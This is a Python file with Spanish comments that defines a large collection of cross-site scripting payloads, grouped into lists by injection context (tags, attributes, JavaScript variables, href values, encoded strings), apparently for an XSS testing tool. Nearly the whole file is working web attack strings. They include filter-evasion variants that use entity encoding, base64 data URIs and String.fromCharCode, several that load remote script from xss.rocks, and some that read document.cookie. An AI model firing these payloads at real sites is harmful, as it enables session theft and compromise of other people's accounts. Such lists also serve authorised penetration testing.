#TIPOS DE XSS:

#Basados en etiqueta donde la idea es poder meter un xss 
#cuando el input esta dentro de una etiqueta
script = "<script>alert(1)</script>"
sCRipt = "<sCRipt>alert(1)</sCRipt>"
scriptCerrandoComillas = '"><script>alert(1)</script>'
imgError = "<img src=x onerror=alert(1) />"
svgOnload = "<svg onload=alert('XSS')>"
svgOnloadMouseOver = '<svg/onload='+"'"+'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'+"'"+">"
malFormedTagA = '\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>'
malFormedTagIMG = '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>'
imgOnMouseOver = "<IMG SRC=# onmouseover="+'"'+"alert('xxs')"+'"'+">"
imgOnerror = '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>'
imgHexadecimal = '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">'
scriptSource = '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>'
scriptSourceDirectamente = '<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>'
scriptBarrasLaterales = '<<SCRIPT>alert("XSS");//\<</SCRIPT>'
iframe = '<iframe src=http://xss.rocks/scriptlet.html <'
scriptCerrandoMal = "</script><script>alert('XSS');</script>"
titleScript='</TITLE><SCRIPT>alert("XSS");</SCRIPT>'
svgOnloadBarraLateral="<svg/onload=alert('XSS')>"
iframeOnMouseover='<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>'
objectType= '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>'
embed = '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>'
onclick = '<x onclick=alert(1) scr=a>click here</x>'
imgHtmlEncode='<img onerror=a&#x6c;ert(1) src=a>'
form= '<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>'
inputOnfocus="<input onfocus=alert(1) autofocus>"
inputDoble="<input onfocus=alert(1) autofocus><input autofocus>"
video='<video><source onerror="alert(1)">'
bodyOninput="<body oninput=alert(1)><input autofocus>"
iframeRoto='<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />'
iframesrcdoc='<iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe>'
hrefonload='<a href="javascript:&apos;<svg onload&equals;alert&lpar;1&rpar;&nvgt;&apos;">CLICK</a>'
details='<details open ontoggle="alert(1)">'
comentario='<!--<img src="--><img src=x onerror=alert(1)//">'
style='<style><img src="</style><img src=x onerror=alert(1)//">'
objectData='<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>'
embedSrc='<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>'
scriptBarras0='<script>alert(1)//</script>0</script>'
foo='<? foo="><script>alert(1)</script>">'
bodyOnpage='<body onpageshow="alert(1)">'
stylePointer='<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>'
svgXmln='<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>'
scriptXmlns='<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>'

onfocus = '"onfocus="alert(1)"autofocus="' 
onfocusPromtComillas = '"onfocus="prompt`1`"autofocus="'

variableComentarios = "';alert(1);//"
variableCerandoString = "';alert(1);a='"
variableRestando = "'-alert(1)-'"
variableComentarioHtml = "\\';alert(1);<!--"
variableBarraComentario = "\\';alert(1);//"
variableBarraComentarioComilla ='\\";alert('+"'"+'XSS'+"'"+');//'
stringEncodeSalirVariable="'"+';[]["filter"]["constructor"](String.fromCharCode(97,108,101,114,116,40,49,41))();'+"'"

hrefOnClick='"onclick="alert(1)"'

stringEncodeComillasDobles='"}[]["filter"]["constructor"](String.fromCharCode(97,108,101,114,116,40,49,41))()//'
stringEncodeComillasSimples="'"+'}[]["filter"]["constructor"](String.fromCharCode(97,108,101,114,116,40,49,41))()//'
stringEncodeElse='"}else{[]["filter"]["constructor"](String.fromCharCode(97,108,101,114,116,40,49,41))()}//'
stringEncodeElseSinCorcheteFinal='"}else{[]["filter"]["constructor"](String.fromCharCode(97,108,101,114,116,40,49,41))()//'
stringEncodeSalirVariable="'"+';[]["filter"]["constructor"](String.fromCharCode(97,108,101,114,116,40,49,41))();'+"'"


payloadsEtiquetas = [script, sCRipt, scriptCerrandoComillas, imgError, svgOnload, 
                     svgOnloadMouseOver,malFormedTagA,malFormedTagIMG, imgOnMouseOver, imgOnerror, 
                     imgHexadecimal, scriptSource, scriptSourceDirectamente, scriptBarrasLaterales,
                     iframe, scriptCerrandoMal, titleScript,svgOnloadBarraLateral,iframeOnMouseover,
                     objectType, embed,form,inputOnfocus,inputDoble,video,bodyOninput,iframeRoto,
                     iframesrcdoc,hrefonload,details,comentario,style,objectData,embedSrc,scriptBarras0,foo,
                     bodyOnpage,stylePointer,scriptXmlns]
payloadsSinEtiquetas = [onfocus, onfocusPromtComillas]
payloadsVariables = [variableCerandoString, variableComentarios, variableRestando, variableComentarioHtml, 
                     variableBarraComentario,stringEncodeSalirVariable,variableBarraComentarioComilla]
payloadHref = [hrefOnClick]
payloadStringEncode = [stringEncodeComillasSimples, stringEncodeComillasDobles, stringEncodeSalirVariable, 
                       stringEncodeElseSinCorcheteFinal,stringEncodeElse]